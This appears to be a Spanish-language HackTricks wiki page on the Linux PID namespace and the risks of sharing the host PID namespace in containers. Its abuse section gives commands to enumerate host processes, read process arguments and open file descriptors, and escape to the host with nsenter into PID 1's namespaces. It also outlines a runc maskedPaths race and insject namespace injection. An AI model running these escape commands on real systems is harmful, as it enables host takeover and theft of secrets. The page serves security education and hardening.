# Espacio de nombres PID

{{#include ../../../../../banners/hacktricks-training.md}}

## Descripción general

El espacio de nombres PID controla cómo se numeran los procesos y qué procesos son visibles. Por eso un container puede tener su propio PID 1 aunque no sea una máquina real. Dentro del espacio de nombres, la workload ve lo que parece ser un árbol de procesos local. Fuera del espacio de nombres, el host sigue viendo los PIDs reales del host y el panorama completo de procesos.

Desde el punto de vista de la seguridad, el espacio de nombres PID importa porque la visibilidad de procesos es valiosa. Una vez que una workload puede ver procesos del host, puede ser capaz de observar nombres de servicios, argumentos de la línea de comandos, secretos pasados en argumentos de procesos, estado derivado del entorno a través de `/proc`, y posibles objetivos de entrada a namespaces. Si puede hacer más que simplemente ver esos procesos, por ejemplo enviar señales o usar ptrace bajo las condiciones adecuadas, el problema se vuelve mucho más serio.

## Funcionamiento

Un nuevo espacio de nombres PID comienza con su propia numeración interna de procesos. El primer proceso creado dentro de él se convierte en PID 1 desde el punto de vista del espacio de nombres, lo que también significa que recibe semánticas especiales tipo init para hijos huérfanos y comportamiento de señales. Esto explica muchas rarezas de containers relacionadas con procesos init, recolección de zombies, y por qué a veces se usan pequeños init wrappers en containers.

La lección importante de seguridad es que un proceso puede parecer aislado porque solo ve su propio árbol de PIDs, pero ese aislamiento puede ser eliminado deliberadamente. Docker expone esto mediante `--pid=host`, mientras que Kubernetes lo hace mediante `hostPID: true`. Una vez que el container se une al namespace PID del host, la workload ve los procesos del host directamente, y muchos caminos de ataque posteriores se vuelven mucho más realistas.

## Laboratorio

Para crear un espacio de nombres PID manualmente:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
La shell ahora ve una vista privada de procesos. La flag `--mount-proc` es importante porque monta una instancia de procfs que coincide con el nuevo PID namespace, haciendo que la lista de procesos sea coherente desde dentro.

Para comparar el comportamiento del container:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
La diferencia es inmediata y fácil de entender, por eso este es un buen primer laboratorio para los lectores.

## Uso en tiempo de ejecución

Los contenedores normales en Docker, Podman, containerd y CRI-O obtienen su propio espacio de nombres PID. Los Pods de Kubernetes normalmente también reciben una vista de PID aislada a menos que la carga de trabajo pida explícitamente compartir el PID del host. Los entornos LXC/Incus se basan en la misma primitiva del kernel, aunque los casos de uso de system-container pueden exponer árboles de procesos más complicados y fomentar atajos de depuración adicionales.

La misma regla se aplica en todas partes: si el runtime decidió no aislar el espacio de nombres PID, eso es una reducción deliberada del límite del contenedor.

## Misconfiguraciones

La misconfiguración canónica es compartir el PID del host. Los equipos a menudo lo justifican para depuración, monitoreo o conveniencia en la gestión de servicios, pero siempre debe considerarse una excepción de seguridad significativa. Incluso si el contenedor no tiene un primitivo de escritura inmediato sobre los procesos del host, solo la visibilidad puede revelar mucho sobre el sistema. Una vez que se añaden capacidades como `CAP_SYS_PTRACE` o acceso útil a procfs, el riesgo se expande significativamente.

Otro error es asumir que, porque la carga de trabajo no puede matar o ptrace procesos del host por defecto, compartir el PID del host es inofensivo. Esa conclusión ignora el valor de la enumeración, la disponibilidad de objetivos para entrada en namespaces y la forma en que la visibilidad de PID se combina con otros controles debilitados.

## Abuso

Si se comparte el espacio de nombres PID del host, un atacante puede inspeccionar procesos del host, recolectar argumentos de procesos, identificar servicios interesantes, localizar PIDs candidatos para `nsenter`, o combinar la visibilidad de procesos con privilegios relacionados con ptrace para interferir con cargas de trabajo del host o vecinas. En algunos casos, simplemente ver el proceso correcto de larga duración es suficiente para reconfigurar el resto del plan de ataque.

El primer paso práctico siempre es confirmar que los procesos del host son realmente visibles:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
Una vez que host PIDs son visibles, los argumentos del proceso y los namespace-entry targets a menudo se convierten en la fuente de información más útil:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
Si `nsenter` está disponible y se tienen privilegios suficientes, pruebe si un proceso visible del host puede utilizarse como puente de espacios de nombres:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
Aunque la entrada esté bloqueada, compartir el PID del host ya resulta valioso porque revela la estructura de servicios, los componentes en tiempo de ejecución y los procesos privilegiados candidatos a ser atacados a continuación.

La visibilidad de los PID del host también hace más realista el abuso de descriptores de archivos. Si un proceso privilegiado del host o una carga de trabajo vecina tiene abierto un archivo o socket sensible, el atacante podría inspeccionar `/proc/<pid>/fd/` y reutilizar ese descriptor según la propiedad, las opciones de montaje de procfs y el modelo de servicio objetivo.
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
Estos comandos son útiles porque responden si `hidepid=1` o `hidepid=2` están reduciendo la visibilidad entre procesos y si descriptores obviamente interesantes, como archivos secretos abiertos, registros o sockets de Unix, son visibles o no.

### Ejemplo completo: PID del host + `nsenter`

Compartir PID del host se convierte en un host escape directo cuando el proceso también tiene suficientes privilegios para unirse a los namespaces del host:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Si el comando tiene éxito, el proceso del contenedor ahora se está ejecutando en los namespaces de montaje, UTS, red, IPC y PID del host. El impacto es la compromisión inmediata del host.

Incluso cuando `nsenter` en sí falta, el mismo resultado puede lograrse a través del binario del host si el sistema de archivos del host está montado:
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Notas recientes en tiempo de ejecución

Algunos ataques relevantes para PID namespaces no son las tradicionales misconfiguraciones `hostPID: true`, sino bugs de implementación en tiempo de ejecución sobre cómo se aplican las protecciones de procfs durante la configuración del contenedor.

#### Condición de carrera de `maskedPaths` hacia el procfs del host

En versiones vulnerables de `runc`, atacantes capaces de controlar la imagen del contenedor o la carga de trabajo `runc exec` podrían competir en la fase de enmascaramiento reemplazando `/dev/null` del lado del contenedor con un symlink a una ruta sensible de procfs como `/proc/sys/kernel/core_pattern`. Si la condición de carrera tenía éxito, el bind mount de la ruta enmascarada podría acabar en el objetivo incorrecto y exponer perillas globales de procfs del host al nuevo contenedor.

Comando útil para revisar:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
Esto es importante porque el impacto eventual puede ser el mismo que una exposición directa de procfs: `core_pattern` o `sysrq-trigger` escribibles, lo que podría llevar a ejecución de código en el host o a denegación de servicio.

#### Inyección de namespace con `insject`

Las herramientas de inyección de namespace como `insject` muestran que la interacción con el PID-namespace no siempre requiere entrar previamente en el namespace objetivo antes de la creación del proceso. Un helper puede adjuntarse más tarde, usar `setns()` y ejecutar manteniendo la visibilidad en el espacio PID objetivo:
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
Este tipo de técnica importa principalmente para depuración avanzada, offensive tooling y flujos de trabajo post-exploitation donde el contexto de namespace debe unirse después de que el runtime ya haya inicializado la carga de trabajo.

### Patrones relacionados de abuso de FD

Dos patrones merecen señalarse explícitamente cuando los PIDs del host son visibles. Primero, un proceso privilegiado puede mantener un descriptor de archivo sensible abierto a través de `execve()` porque no se marcó `O_CLOEXEC`. Segundo, los servicios pueden pasar descriptores de archivo por sockets Unix mediante `SCM_RIGHTS`. En ambos casos el objeto interesante ya no es la ruta de acceso, sino el handle ya abierto que un proceso de menor privilegio puede heredar o recibir.

Esto importa en el trabajo con contenedores porque el handle puede apuntar a `docker.sock`, un log privilegiado, un archivo secreto del host u otro objeto de alto valor incluso cuando la ruta en sí no es accesible directamente desde el sistema de archivos del contenedor.

## Comprobaciones

El propósito de estos comandos es determinar si el proceso tiene una vista de PID privada o si ya puede enumerar un panorama de procesos mucho más amplio.
```bash
readlink /proc/self/ns/pid   # PID namespace identifier
ps -ef | head                # Quick process list sample
ls /proc | head              # Process IDs and procfs layout
```
- Si la lista de procesos contiene servicios del host evidentes, probablemente la compartición de PID del host ya esté en efecto.
- Ver solo un árbol pequeño local al contenedor es la línea base normal; ver `systemd`, `dockerd`, u otros daemons no relacionados no lo es.
- Una vez que los PID del host son visibles, incluso la información de procesos de solo lectura se vuelve un reconocimiento útil.

Si descubres un contenedor ejecutándose con compartición de PID del host, no lo trates como una diferencia cosmética. Es un cambio importante en lo que la carga de trabajo puede observar y potencialmente afectar.
